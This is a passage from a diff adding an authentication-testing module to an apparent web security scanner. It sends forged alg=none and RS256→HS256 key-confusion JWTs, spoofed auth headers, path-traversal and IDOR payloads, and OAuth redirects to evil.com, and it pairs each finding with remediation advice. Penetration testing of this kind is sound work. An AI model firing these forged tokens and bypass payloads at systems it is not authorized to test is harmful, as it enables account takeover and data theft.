@@ -1,0 +1,1039 @@
+     1→     1→from __future__ import annotations
+     2→     2→
+     3→     3→import base64
+     4→     4→import hashlib
+     5→     5→import hmac
+     6→     6→import json
+     7→     7→import time
+     8→     8→import urllib.parse
+     9→     9→from typing import Any, Dict, List, Optional, Tuple
+    10→    10→from ..http_layer import http_probe, Finding
+    11→    11→
+    12→    12→
+    13→    13→AUTH_BYPASS_PATHS = [
+    14→    14→    "/api/v1/users", "/api/users", "/api/v1/me",
+    15→    15→    "/api/v1/admin/users", "/api/admin", "/api/v1/config",
+    16→    16→    "/api/v1/secrets", "/api/v1/keys", "/api/v1/tokens",
+    17→    17→    "/api/v1/internal", "/api/debug", "/api/status",
+    18→    18→    "/api/health", "/.well-known/openid-configuration",
+    19→    19→]
+    20→    20→
+    21→    21→AUTH_HEADERS = [
+    22→    22→    {"Authorization": "Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9."},
+    23→    23→    {"Authorization": "Bearer null"},
+    24→    24→    {"Authorization": "Bearer undefined"},
+    25→    25→    {"X-Forwarded-For": "127.0.0.1"},
+    26→    26→    {"X-Original-URL": "/admin"},
+    27→    27→    {"X-Rewrite-URL": "/admin"},
+    28→    28→    {"X-Custom-IP-Authorization": "127.0.0.1"},
+    29→    29→    {"X-Forwarded-Host": "localhost"},
+    30→    30→    {"X-Host": "localhost"},
+    31→    31→    {"Referer": "https://localhost/admin"},
+    32→    32→    {"X-Real-IP": "127.0.0.1"},
+    33→    33→    {"Authorization": "Basic YWRtaW46YWRtaW4="},  # admin:admin
+    34→    34→    {"X-Api-Key": ""},
+    35→    35→    {"X-Access-Token": ""},
+    36→    36→    {"Cookie": "session=admin; role=admin"},
+    37→    37→]
+    38→    38→
+    39→    39→# ── JWT helpers (stdlib-only, no PyJWT dependency) ─────────────────────
+    40→    40→
+    41→    41→def _b64url_encode(data: bytes) -> str:
+    42→    42→    """Base64url-encode bytes (no padding)."""
+    43→    43→    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")
+    44→    44→
+    45→    45→
+    46→    46→def _b64url_decode(s: str) -> bytes:
+    47→    47→    """Base64url-decode with padding restoration."""
+    48→    48→    padding = 4 - len(s) % 4
+    49→    49→    if padding != 4:
+    50→    50→        s += "=" * padding
+    51→    51→    return base64.urlsafe_b64decode(s)
+    52→    52→
+    53→    53→
+    54→    54→def _build_jwt(header: Dict[str, Any], payload: Dict[str, Any],
+    55→    55→               secret: Optional[bytes] = None) -> str:
+    56→    56→    """Build a JWT token. If secret is None, no signature (alg=none)."""
+    57→    57→    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
+    58→    58→    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
+    59→    59→    signing_input = f"{h}.{p}".encode()
+    60→    60→    if secret is None:
+    61→    61→        return f"{h}.{p}."
+    62→    62→    sig = hmac.new(secret, signing_input, hashlib.sha256).digest()
+    63→    63→    return f"{h}.{p}.{_b64url_encode(sig)}"
+    64→    64→
+    65→    65→
+    66→    66→def _try_decode_jwt_payload(token: str) -> Optional[Dict[str, Any]]:
+    67→    67→    """Try to decode JWT payload without verification."""
+    68→    68→    try:
+    69→    69→        parts = token.split(".")
+    70→    70→        if len(parts) != 3:
+    71→    71→            return None
+    72→    72→        return json.loads(_b64url_decode(parts[1]))
+    73→    73→    except Exception:
+    74→    74→        return None
+    75→    75→
+    76→    76→
+    77→    77→def _try_decode_jwt_header(token: str) -> Optional[Dict[str, Any]]:
+    78→    78→    """Try to decode JWT header without verification."""
+    79→    79→    try:
+    80→    80→        parts = token.split(".")
+    81→    81→        if len(parts) < 2:
+    82→    82→            return None
+    83→    83→        return json.loads(_b64url_decode(parts[0]))
+    84→    84→    except Exception:
+    85→    85→        return None
+    86→    86→
+    87→    87→
+    88→    88→def _extract_bearer_token(resp: Dict[str, Any]) -> Optional[str]:
+    89→    89→    """Extract a JWT Bearer token from response headers or body."""
+    90→    90→    # Check WWW-Authenticate / Set-Cookie / response body for tokens
+    91→    91→    headers = resp.get("headers", {})
+    92→    92→    auth_header = headers.get("www-authenticate", "")
+    93→    93→    if auth_header.startswith("Bearer "):
+    94→    94→        return auth_header[7:].split(",")[0].strip()  # strip params
+    95→    95→    # Check body for jwt patterns
+    96→    96→    body = resp.get("body", "")
+    97→    97→    import re
+    98→    98→    patterns = [
+    99→    99→        r'"token"\s*:\s*"(eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)"',
+   100→   100→        r'"access_token"\s*:\s*"(eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)"',
+   101→   101→        r'"id_token"\s*:\s*"(eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)"',
+   102→   102→    ]
+   103→   103→    for pat in patterns:
+   104→   104→        m = re.search(pat, body)
+   105→   105→        if m:
+   106→   106→            return m.group(1)
+   107→   107→    return None
+   108→   108→
+   109→   109→
+   110→   110→# ── Main entry point ─────────────────────────────────────────────────────
+   111→   111→
+   112→   112→def run_auth(target: str, base_url: str, timeout: int = 8,
+   113→   113→              verify_tls: bool = True) -> List[Finding]:
+   114→   114→    """Comprehensive auth module. Covers 45+ techniques across 9 categories.
+   115→   115→
+   116→   116→    Categories:
+   117→   117→      1.  Header-based auth bypass (existing, expanded to all paths)
+   118→   118→      2.  HTTP method tampering (expanded with CONNECT, TRACE, etc.)
+   119→   119→      3.  Path traversal (expanded with 20+ encoding variants)
+   120→   120→      4.  IDOR (expanded with UUID, base64, negative, float, boolean IDs)
+   121→   121→      5.  JWT deep analysis (alg none, RS256→HS256 confusion, expired, aud, jwk/jku)
+   122→   122→      6.  OAuth/OIDC misconfiguration
+   123→   123→      7.  Session management deep
+   124→   124→      8.  Rate limiting deep
+   125→   125→      9.  HTTP method override headers
+   126→   126→    """
+   127→   127→    findings: List[Finding] = []
+   128→   128→    host = target.replace("https://", "").replace("http://", "").split("/")[0]
+   129→   129→
+   130→   130→    def add(title, severity, desc, evidence, pts=0,
+   131→   131→            remediation: str = "Implement proper authentication middleware. Validate tokens server-side."):
+   132→   132→        findings.append(Finding(
+   133→   133→            title=title, severity=severity, category="auth_bypass",
+   134→   134→            module="auth", description=desc, evidence=evidence,
+   135→   135→            asset=host, points_deducted=pts, remediation=remediation,
+   136→   136→        ))
+   137→   137→
+   138→   138→    # ─── Technique 1-12: Header-based bypasses (ALL paths now) ──────────
+   139→   139→    for path in AUTH_BYPASS_PATHS:
+   140→   140→        url = base_url.rstrip("/") + path
+   141→   141→        for i, headers in enumerate(AUTH_HEADERS):
+   142→   142→            resp = http_probe(url, headers=headers, timeout=timeout, verify_tls=verify_tls)
+   143→   143→            status = resp.get("status", 0)
+   144→   144→            body = resp.get("body", "")[:2048].lower()
+   145→   145→
+   146→   146→            if status == 200 and len(body) > 20:
+   147→   147→                is_protected = any(kw in body for kw in [
+   148→   148→                    "unauthorized", "forbidden", "401", "403", "login required"
+   149→   149→                ])
+   150→   150→                if not is_protected:
+   151→   151→                    header_name = list(headers.keys())[0] if headers else "none"
+   152→   152→                    add(
+   153→   153→                        f"Auth bypass via {header_name} on {path}",
+   154→   154→                        "critical" if "admin" in path.lower() or "secret" in path.lower() or "key" in path.lower() else "high",
+   155→   155→                        f"Endpoint {path} accessible with suspicious {header_name} header",
+   156→   156→                        f"{header_name} header bypassed auth -> 200 OK",
+   157→   157→                        15 if ("admin" in path.lower() or "secret" in path.lower() or "key" in path.lower()) else 10,
+   158→   158→                    )
+   159→   159→                    break  # One bypass per endpoint is enough
+   160→   160→
+   161→   161→    # ─── Technique 13: HTTP method tampering (EXPANDED) ─────────────────
+   162→   162→    _method_tamper_paths = ["/api/v1/users", "/admin", "/api/v1/config",
+   163→   163→                           "/api/v1/admin", "/api/v1/secrets"]
+   164→   164→    _method_tamper_methods = ["OPTIONS", "PUT", "DELETE", "PATCH",
+   165→   165→                              "CONNECT", "TRACE", "PROPFIND"]
+   166→   166→    for path in _method_tamper_paths:
+   167→   167→        url = base_url.rstrip("/") + path
+   168→   168→        for method in _method_tamper_methods:
+   169→   169→            resp = http_probe(url, method=method, timeout=timeout, verify_tls=verify_tls)
+   170→   170→            status = resp.get("status", 0)
+   171→   171→            body = resp.get("body", "")[:1024].lower()
+   172→   172→            # TRACE method may echo back request headers — information leak
+   173→   173→            if method == "TRACE" and status == 200:
+   174→   174→                add(
+   175→   175→                    f"TRACE method enabled: {path}",
+   176→   176→                    "medium",
+   177→   177→                    f"TRACE method is enabled on {path}, which can lead to XST (Cross-Site Tracing) attacks",
+   178→   178→                    f"TRACE {path} -> 200",
+   179→   179→                    5,
+   180→   180→                    remediation="Disable TRACE HTTP method on all endpoints.",
+   181→   181→                )
+   182→   182→                break
+   183→   183→            if status == 200 and len(body) > 20:
+   184→   184→                is_protected = any(kw in body for kw in [
+   185→   185→                    "unauthorized", "forbidden", "401", "403"
+   186→   186→                ])
+   187→   187→                if not is_protected:
+   188→   188→                    add(
+   189→   189→                        f"Method tampering: {method} {path}",
+   190→   190→                        "high",
+   191→   191→                        f"{method} method returns 200 on {path} — may bypass auth checks",
+   192→   192→                        f"{method} {path} -> 200",
+   193→   193→                        10,
+   194→   194→                    )
+   195→   195→                    break
+   196→   196→
+   197→   197→    # ─── Technique 13b: Method override headers ─────────────────────────
+   198→   198→    _override_headers = [
+   199→   199→        {"X-HTTP-Method-Override": "DELETE"},
+   200→   200→        {"X-Method-Override": "DELETE"},
+   201→   201→        {"_method": "DELETE"},
+   202→   202→        {"X-HTTP-Method-Override": "PUT"},
+   203→   203→        {"X-Method-Override": "PUT"},
+   204→   204→    ]
+   205→   205→    for path in ["/api/v1/users/1", "/api/v1/admin/users/1", "/api/v1/config"]:
+   206→   206→        url = base_url.rstrip("/") + path
+   207→   207→        for oh in _override_headers:
+   208→   208→            resp = http_probe(url, method="POST", headers=oh, timeout=timeout, verify_tls=verify_tls)
+   209→   209→            status = resp.get("status", 0)
+   210→   210→            body = resp.get("body", "")[:1024].lower()
+   211→   211→            if status in (200, 204, 405):
+   212→   212→                override_name = list(oh.keys())[0]
+   213→   213→                add(
+   214→   214→                    f"Method override accepted: {override_name} on {path}",
+   215→   215→                    "medium",
+   216→   216→                    f"Server honors {override_name}={oh[override_name]} header, "
+   217→   217→                    f"allowing HTTP method bypass via POST",
+   218→   218→                    f"POST {path} with {override_name} -> {status}",
+   219→   219→                    5,
+   220→   220→                    remediation="Do not trust client-supplied method override headers. "
+   221→   221→                                "Use the actual HTTP method for routing."
+   222→   222→                )
+   223→   223→                break
+   224→   224→
+   225→   225→    # ─── Technique 14: Path traversal (EXPANDED — 24 variants) ─────────
+   226→   226→    traversal_paths = [
+   227→   227→        # Original variants (kept)
+   228→   228→        "/api/v1/../admin",
+   229→   229→        "/api/..%2fadmin",
+   230→   230→        "/static/..%2f..%2fadmin",
+   231→   231→        "/%2e%2e/admin",
+   232→   232→        # Double encoding
+   233→   233→        "/..%252f..%252fadmin",
+   234→   234→        "/api/%252e%252e/admin",
+   235→   235→        "/%252e%252e/%252e%252e/admin",
+   236→   236→        # UTF-8 overlong encoding
+   237→   237→        "/%c0%ae%c0%ae/admin",
+   238→   238→        "/%c0%ae%c0%ae/%c0%ae%c0%ae/admin",
+   239→   239→        "/..%c0%afadmin",
+   240→   240→        # Mixed case
+   241→   241→        "/%2E%2e/admin",
+   242→   242→        "/%2e%2E/admin",
+   243→   243→        "/%2E%2E/admin",
+   244→   244→        # NULL byte injection
+   245→   245→        "/..%00/admin",
+   246→   246→        "/api/..%00/admin",
+   247→   247→        "/admin%00",
+   248→   248→        "/api/v1/users%00.css",
+   249→   249→        # Path truncation (Windows 8.3 shortname style)
+   250→   250→        "/api/v1/users/ADMINI~1",
+   251→   251→        "/api/v1/users/CONFIG~1",
+   252→   252→        # UNC paths
+   253→   253→        r"//evil.com/share",
+   254→   254→        r"/../evil.com/share",
+   255→   255→        # Extra slash variations
+   256→   256→        "/api/v1/..//admin",
+   257→   257→        "/api/v1/./../admin",
+   258→   258→        "/..././..././admin",
+   259→   259→        # URL-encoded slash
+   260→   260→        "/api/v1/users%2f..%2f..%2fadmin",
+   261→   261→    ]
+   262→   262→    traversal_found = False
+   263→   263→    for tp in traversal_paths:
+   264→   264→        url = base_url.rstrip("/") + tp
+   265→   265→        resp = http_probe(url, timeout=timeout, verify_tls=verify_tls)
+   266→   266→        if resp.get("status") == 200 and len(resp.get("body", "")) > 20:
+   267→   267→            body_lower = resp.get("body", "")[:2048].lower()
+   268→   268→            is_protected = any(kw in body_lower for kw in [
+   269→   269→                "unauthorized", "forbidden", "401", "403", "not found", "error"
+   270→   270→            ])
+   271→   271→            if not is_protected:
+   272→   272→                add(
+   273→   273→                    f"Path traversal: {tp}",
+   274→   274→                    "critical",
+   275→   275→                    f"Path traversal bypassed access controls: {tp}",
+   276→   276→                    f"GET {tp} -> 200",
+   277→   277→                    15,
+   278→   278→                    remediation="Normalize and canonicalize all request paths before routing. "
+   279→   279→                                "Reject paths containing '..' sequences. Use allow-lists for file access."
+   280→   280→                )
+   281→   281→                traversal_found = True
+   282→   282→                break
+   283→   283→    # Report if no traversal found (info-level)
+   284→   284→    if not traversal_found:
+   285→   285→        add(
+   286→   286→            "Path traversal: no bypass found (24 variants tested)",
+   287→   287→            "info",
+   288→   288→            "Tested 24 path traversal variants against admin/config endpoints. "
+   289→   289→            "None returned unprotected 200 responses.",
+   290→   290→            "24 traversal payloads -> all blocked or non-200",
+   291→   291→            0,
+   292→   292→            remediation="",
+   293→   293→        )
+   294→   294→
+   295→   295→    # ─── Technique 15: IDOR probe (EXPANDED) ───────────────────────────
+   296→   296→    _idor_ids = [
+   297→   297→        "1", "admin", "me", "0",           # original
+   298→   298→        "00000000-0000-0000-0000-000000000001",  # UUID format
+   299→   299→        "00000000-0000-0000-0000-000000000000",  # zero UUID
+   300→   300→        "MQ==",                                # base64("1")
+   301→   301→        "YWRtaW4=",                            # base64("admin")
+   302→   302→        "-1", "-999",                          # negative IDs
+   303→   303→        "1.0", "0.5",                          # float IDs
+   304→   304→        "true", "false",                       # boolean IDs
+   305→   305→        "999999", "2147483647",                # sequential range / int max
+   306→   306→        "0x1", "0x0",                          # hex IDs
+   307→   307→    ]
+   308→   308→    _idor_paths = [
+   309→   309→        "/api/v1/users/",
+   310→   310→        "/api/users/",
+   311→   311→        "/api/v1/accounts/",
+   312→   312→        "/api/v1/profiles/",
+   313→   313→        "/api/v1/orders/",
+   314→   314→        "/api/v1/documents/",
+   315→   315→    ]
+   316→   316→    idor_found = False
+   317→   317→    for id_val in _idor_ids:
+   318→   318→        for path in _idor_paths:
+   319→   319→            url = base_url.rstrip("/") + path + urllib.parse.quote(id_val, safe="")
+   320→   320→            resp = http_probe(url, timeout=timeout, verify_tls=verify_tls)
+   321→   321→            if resp.get("status") == 200:
+   322→   322→                body = resp.get("body", "")[:2048]
+   323→   323→                if any(kw in body.lower() for kw in [
+   324→   324→                    "email", "password", "secret", "token", "key",
+   325→   325→                    "ssn", "credit", "phone", "address", "dob",
+   326→   326→                ]):
+   327→   327→                    add(
+   328→   328→                        f"Potential IDOR: {path}{id_val}",
+   329→   329→                        "critical",
+   330→   330→                        f"User data accessible without auth via IDOR: {path}{id_val}",
+   331→   331→                        f"GET {path}{id_val} -> 200 (sensitive data in response)",
+   332→   332→                        15,
+   333→   333→                        remediation="Implement object-level authorization checks. "
+   334→   334→                                    "Never rely on client-supplied IDs for access control. "
+   335→   335→                                    "Use indirect references where possible."
+   336→   336→                    )
+   337→   337→                    idor_found = True
+   338→   338→                    break
+   339→   339→        if idor_found:
+   340→   340→            break
+   341→   341→    if not idor_found:
+   342→   342→        add(
+   343→   343→            "IDOR: no data exposure found (16 IDs x 6 endpoints)",
+   344→   344→            "info",
+   345→   345→            "Tested 16 ID patterns across 6 endpoint patterns. "
+   346→   346→            "None returned sensitive data without authentication.",
+   347→   347→            "96 IDOR probes -> all safe",
+   348→   348→            0,
+   349→   349→            remediation="",
+   350→   350→        )
+   351→   351→
+   352→   352→    # ─── Technique 16: JWT Deep Analysis ────────────────────────────────
+   353→   353→    _jwt_endpoints = [
+   354→   354→        "/api/v1/me", "/api/v1/users/me", "/api/me",
+   355→   355→        "/api/v1/profile", "/api/v1/account",
+   356→   356→    ]
+   357→   357→
+   358→   358→    # 16a: Algorithm none bypass (improved — proper empty signature)
+   359→   359→    _none_tokens = [
+   360→   360→        # alg=none with empty signature
+   361→   361→        _build_jwt({"alg": "none", "typ": "JWT"},
+   362→   362→                   {"sub": "admin", "role": "admin", "iat": int(time.time())}),
+   363→   363→        # alg=None (capitalized)
+   364→   364→        _build_jwt({"alg": "None", "typ": "JWT"},
+   365→   365→                   {"sub": "admin", "role": "admin", "iat": int(time.time())}),
+   366→   366→        # alg=nOnE (mixed case)
+   367→   367→        _build_jwt({"alg": "nOnE", "typ": "JWT"},
+   368→   368→                   {"sub": "admin", "role": "admin", "iat": int(time.time())}),
+   369→   369→        # alg=none with no trailing dot
+   370→   370→        _b64url_encode(json.dumps({"alg": "none", "typ": "JWT"}, separators=(",", ":")).encode())
+   371→   371→        + "."
+   372→   372→        + _b64url_encode(json.dumps({"sub": "admin", "role": "admin"}, separators=(",", ":")).encode()),
+   373→   373→    ]
+   374→   374→    for token in _none_tokens:
+   375→   375→        for ep in _jwt_endpoints:
+   376→   376→            url = base_url.rstrip("/") + ep
+   377→   377→            resp = http_probe(url, headers={"Authorization": f"Bearer {token}"},
+   378→   378→                              timeout=timeout, verify_tls=verify_tls)
+   379→   379→            status = resp.get("status", 0)
+   380→   380→            body = resp.get("body", "")[:2048].lower()
+   381→   381→            if status == 200 and not any(kw in body for kw in [
+   382→   382→                "unauthorized", "forbidden", "401", "403", "invalid", "error"
+   383→   383→            ]):
+   384→   384→                add(
+   385→   385→                    f"JWT alg=none bypass: {ep}",
+   386→   386→                    "critical",
+   387→   387→                    f"Server accepted JWT with algorithm 'none' (no signature) on {ep}. "
+   388→   388→                    f"Attacker can forge arbitrary tokens.",
+   389→   389→                    f"Bearer alg=none token -> 200 on {ep}",
+   390→   390→                    20,
+   391→   391→                    remediation="Explicitly reject JWTs with 'none' algorithm. "
+   392→   392→                                "Maintain an allowlist of accepted algorithms (e.g., RS256, ES256). "
+   393→   393→                                "Never use the JWT header 'alg' field to select verification method."
+   394→   394→                )
+   395→   395→                break
+   396→   396→        else:
+   397→   397→            continue
+   398→   398→        break
+   399→   399→
+   400→   400→    # 16b: RS256→HS256 key confusion
+   401→   401→    # Fetch the JWKS or /.well-known/jwks.json to get the public key
+   402→   402→    jwks_url = base_url.rstrip("/") + "/.well-known/jwks.json"
+   403→   403→    jwks_resp = http_probe(jwks_url, timeout=timeout, verify_tls=verify_tls)
+   404→   404→    # Also try common JWKS paths
+   405→   405→    if jwks_resp.get("status") != 200:
+   406→   406→        for alt_jwks in ["/jwks.json", "/api/v1/jwks", "/.well-known/openid-configuration"]:
+   407→   407→            alt_url = base_url.rstrip("/") + alt_jwks
+   408→   408→            alt_resp = http_probe(alt_url, timeout=timeout, verify_tls=verify_tls)
+   409→   409→            if alt_resp.get("status") == 200:
+   410→   410→                # If it's OIDC config, extract jwks_uri
+   411→   411→                try:
+   412→   412→                    oidc_cfg = json.loads(alt_resp.get("body", ""))
+   413→   413→                    if "jwks_uri" in oidc_cfg:
+   414→   414→                        jwks_uri = oidc_cfg["jwks_uri"]
+   415→   415→                        if jwks_uri.startswith("http"):
+   416→   416→                            jwks_resp = http_probe(jwks_uri, timeout=timeout, verify_tls=verify_tls)
+   417→   417→                        else:
+   418→   418→                            jwks_resp = http_probe(base_url.rstrip("/") + jwks_uri,
+   419→   419→                                                   timeout=timeout, verify_tls=verify_tls)
+   420→   420→                        break
+   421→   421→                except (json.JSONDecodeError, KeyError):
+   422→   422→                    pass
+   423→   423→
+   424→   424→    # Extract public key components from JWKS and attempt HS256 confusion
+   425→   425→    hs256_secret: Optional[bytes] = None
+   426→   426→    if jwks_resp.get("status") == 200:
+   427→   427→        try:
+   428→   428→            jwks_data = json.loads(jwks_resp.get("body", ""))
+   429→   429→            keys = jwks_data.get("keys", [])
+   430→   430→            if keys:
+   431→   431→                # Reconstruct PEM public key from JWK RSA components
+   432→   432→                first_key = keys[0]
+   433→   433→                if first_key.get("kty") == "RSA":
+   434→   434→                    n_b64 = first_key.get("n", "")
+   435→   435→                    e_b64 = first_key.get("e", "AQAB")
+   436→   436→                    # Build a minimal PEM-formatted public key from n and e
+   437→   437→                    # This is the exact byte sequence the server uses for RSA verification.
+   438→   438→                    # If we can sign with HS256 using this key as secret, confusion works.
+   439→   439→                    n_bytes = _b64url_decode(n_b64)
+   440→   440→                    e_bytes = _b64url_decode(e_b64)
+   441→   441→                    # Construct DER-encoded RSAPublicKey: SEQUENCE { INTEGER n, INTEGER e }
+   442→   442→                    def _der_len(val_len: int) -> bytes:
+   443→   443→                        if val_len < 128:
+   444→   444→                            return bytes([val_len])
+   445→   445→                        elif val_len < 256:
+   446→   446→                            return bytes([0x81, val_len])
+   447→   447→                        else:
+   448→   448→                            return bytes([0x82, (val_len >> 8) & 0xff, val_len & 0xff])
+   449→   449→
+   450→   450→                    def _der_integer(val: bytes) -> bytes:
+   451→   451→                        # Prepend 0x00 if high bit set
+   452→   452→                        if val[0] & 0x80:
+   453→   453→                            val = b"\x00" + val
+   454→   454→                        return b"\x02" + _der_len(len(val)) + val
+   455→   455→
+   456→   456→                    n_der = _der_integer(n_bytes)
+   457→   457→                    e_der = _der_integer(e_bytes)
+   458→   458→                    seq_payload = n_der + e_der
+   459→   459→                    der_bytes = b"\x30" + _der_len(len(seq_payload)) + seq_payload
+   460→   460→
+   461→   461→                    # Wrap in SubjectPublicKeyInfo for PEM
+   462→   462→                    oid_rsa = base64.b64decode(
+   463→   463→                        "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A"
+   464→   464→                    )  # SHA-256 with RSA
+   465→   465→                    spki_payload = oid_rsa + der_bytes
+   466→   466→                    spki_bytes = b"\x30" + _der_len(len(spki_payload)) + spki_payload
+   467→   467→
+   468→   468→                    pem = "-----BEGIN PUBLIC KEY-----\n"
+   469→   469→                    pem += base64.b64encode(spki_bytes).decode()
+   470→   470→                    pem += "\n-----END PUBLIC KEY-----"
+   471→   471→                    hs256_secret = pem.encode()
+   472→   472→        except (json.JSONDecodeError, KeyError, Exception):
+   473→   473→            pass
+   474→   474→
+   475→   475→    if hs256_secret:
+   476→   476→        confusion_token = _build_jwt(
+   477→   477→            {"alg": "HS256", "typ": "JWT"},
+   478→   478→            {"sub": "admin", "role": "admin", "iat": int(time.time())},
+   479→   479→            secret=hs256_secret,
+   480→   480→        )
+   481→   481→        for ep in _jwt_endpoints:
+   482→   482→            url = base_url.rstrip("/") + ep
+   483→   483→            resp = http_probe(url, headers={"Authorization": f"Bearer {confusion_token}"},
+   484→   484→                              timeout=timeout, verify_tls=verify_tls)
+   485→   485→            status = resp.get("status", 0)
+   486→   486→            body = resp.get("body", "")[:2048].lower()
+   487→   487→            if status == 200 and not any(kw in body for kw in [
+   488→   488→                "unauthorized", "forbidden", "401", "403", "invalid"
+   489→   489→            ]):
+   490→   490→                add(
+   491→   491→                    f"JWT RS256→HS256 key confusion: {ep}",
+   492→   492→                    "critical",
+   493→   493→                    f"Server accepts HS256-signed token using RSA public key as HMAC secret. "
+   494→   494→                    f"Complete authentication bypass via algorithm confusion.",
+   495→   495→                    f"HS256 token signed with public key -> 200 on {ep}",
+   496→   496→                    20,
+   497→   497→                    remediation="Explicitly specify the expected algorithm when verifying JWTs. "
+   498→   498→                                "Do not allow the 'alg' header to control verification. "
+   499→   499→                                "Use separate keys for different algorithms."
+   500→   500→                )
+   501→   501→                break
+   502→   502→
+   503→   503→    # 16c: Expired token acceptance
+   504→   504→    _expired_token = _build_jwt(
+   505→   505→        {"alg": "HS256", "typ": "JWT"},
+   506→   506→        {"sub": "admin", "role": "admin", "exp": 946684800, "iat": 946684700},
+   507→   507→        secret=b"reconpro-test-key",
+   508→   508→    )
+   509→   509→    for ep in _jwt_endpoints:
+   510→   510→        url = base_url.rstrip("/") + ep
+   511→   511→        resp = http_probe(url, headers={"Authorization": f"Bearer {_expired_token}"},
+   512→   512→                          timeout=timeout, verify_tls=verify_tls)
+   513→   513→        status = resp.get("status", 0)
+   514→   514→        body = resp.get("body", "")[:2048].lower()
+   515→   515→        if status == 200 and not any(kw in body for kw in [
+   516→   516→            "unauthorized", "forbidden", "401", "403", "expired", "invalid"
+   517→   517→        ]):
+   518→   518→            add(
+   519→   519→                f"JWT expired token accepted: {ep}",
+   520→   520→                "high",
+   521→   521→                f"Server accepted an expired JWT (exp=2000-01-01) on {ep}. "
+   522→   522→                f"Token expiry is not being enforced.",
+   523→   523→                f"Expired token (exp=946684800) -> 200 on {ep}",
+   524→   524→                12,
+   525→   525→                remediation="Always validate the 'exp' claim server-side. "
+   526→   526→                            "Reject tokens where exp < current_time. "
+   527→   527→                            "Use a small leeway window (< 30s)."
+   528→   528→            )
+   529→   529→            break
+   530→   530→
+   531→   531→    # 16d: Audience mismatch
+   532→   532→    _aud_mismatch_token = _build_jwt(
+   533→   533→        {"alg": "HS256", "typ": "JWT"},
+   534→   534→        {"sub": "admin", "role": "admin", "aud": "https://evil.com", "iat": int(time.time())},
+   535→   535→        secret=b"reconpro-test-key",
+   536→   536→    )
+   537→   537→    for ep in _jwt_endpoints:
+   538→   538→        url = base_url.rstrip("/") + ep
+   539→   539→        resp = http_probe(url, headers={"Authorization": f"Bearer {_aud_mismatch_token}"},
+   540→   540→                          timeout=timeout, verify_tls=verify_tls)
+   541→   541→        status = resp.get("status", 0)
+   542→   542→        body = resp.get("body", "")[:2048].lower()
+   543→   543→        if status == 200 and not any(kw in body for kw in [
+   544→   544→            "unauthorized", "forbidden", "401", "403", "invalid"
+   545→   545→        ]):
+   546→   546→            add(
+   547→   547→                f"JWT audience mismatch accepted: {ep}",
+   548→   548→                "high",
+   549→   549→                f"Server accepted JWT with audience 'https://evil.com' on {ep}. "
+   550→   550→                f"The 'aud' claim is not validated.",
+   551→   551→                f"Token with aud=https://evil.com -> 200 on {ep}",
+   552→   552→                12,
+   553→   553→                remediation="Always validate the 'aud' (audience) claim matches the expected value. "
+   554→   554→                            "Reject tokens with mismatched audiences."
+   555→   555→            )
+   556→   556→            break
+   557→   557→
+   558→   558→    # 16e: jwk header injection
+   559→   559→    _jwk_token = _build_jwt(
+   560→   560→        {"alg": "HS256", "typ": "JWT",
+   561→   561→         "jwk": {"kty": "oct", "k": _b64url_encode(b"reconpro-test-key"),
+   562→   562→                 "alg": "HS256"}},
+   563→   563→        {"sub": "admin", "role": "admin", "iat": int(time.time())},
+   564→   564→        secret=b"reconpro-test-key",
+   565→   565→    )
+   566→   566→    for ep in _jwt_endpoints[:2]:
+   567→   567→        url = base_url.rstrip("/") + ep
+   568→   568→        resp = http_probe(url, headers={"Authorization": f"Bearer {_jwk_token}"},
+   569→   569→                          timeout=timeout, verify_tls=verify_tls)
+   570→   570→        status = resp.get("status", 0)
+   571→   571→        body = resp.get("body", "")[:2048].lower()
+   572→   572→        if status == 200 and not any(kw in body for kw in [
+   573→   573→            "unauthorized", "forbidden", "401", "403", "invalid"
+   574→   574→        ]):
+   575→   575→            add(
+   576→   576→                f"JWT jwk header injection: {ep}",
+   577→   577→                "high",
+   578→   578→                f"Server accepted JWT with embedded 'jwk' header. "
+   579→   579→                f"The server may trust the key from the token header itself.",
+   580→   580→                f"Token with embedded jwk -> 200 on {ep}",
+   581→   581→                15,
+   582→   582→                remediation="Never trust keys embedded in JWT headers. "
+   583→   583→                            "Always use server-stored keys for verification. "
+   584→   584→                            "Reject tokens containing 'jwk' or 'jku' headers."
+   585→   585→            )
+   586→   586→            break
+   587→   587→
+   588→   588→    # 16f: jku header injection
+   589→   589→    _jku_token = _build_jwt(
+   590→   590→        {"alg": "RS256", "typ": "JWT",
+   591→   591→         "jku": f"{base_url.rstrip('/')}/.well-known/jwks.json"},
+   592→   592→        {"sub": "admin", "role": "admin", "iat": int(time.time())},
+   593→   593→        secret=None,
+   594→   594→    )
+   595→   595→    for ep in _jwt_endpoints[:2]:
+   596→   596→        url = base_url.rstrip("/") + ep
+   597→   597→        resp = http_probe(url, headers={"Authorization": f"Bearer {_jku_token}"},
+   598→   598→                          timeout=timeout, verify_tls=verify_tls)
+   599→   599→        status = resp.get("status", 0)
+   600→   600→        body = resp.get("body", "")[:2048].lower()
+   601→   601→        if status == 200 and not any(kw in body for kw in [
+   602→   602→            "unauthorized", "forbidden", "401", "403", "invalid"
+   603→   603→        ]):
+   604→   604→            add(
+   605→   605→                f"JWT jku header injection: {ep}",
+   606→   606→                "high",
+   607→   607→                f"Server accepted JWT with 'jku' header pointing to attacker-controlled URL. "
+   608→   608→                f"This allows key injection attacks.",
+   609→   609→                f"Token with jku header -> 200 on {ep}",
+   610→   610→                15,
+   611→   611→                remediation="Never trust 'jku' headers in JWT. Always use a pre-configured key set URL. "
+   612→   612→                            "Reject tokens containing 'jku' or 'x5u' headers pointing to external URLs."
+   613→   613→            )
+   614→   614→            break
+   615→   615→
+   616→   616→    # ─── Technique 17: OAuth/OIDC Misconfiguration ──────────────────────
+   617→   617→
+   618→   618→    # 17a: Open redirect via OAuth callback
+   619→   619→    _oauth_redirect_payloads = [
+   620→   620→        "/oauth/callback?redirect_uri=https://evil.com",
+   621→   621→        "/oauth/callback?redirect_uri=https://evil.com&state=x",
+   622→   622→        "/oauth/callback?redirect_uri=\\\\evil.com",
+   623→   623→        "/oauth/callback?next=https://evil.com",
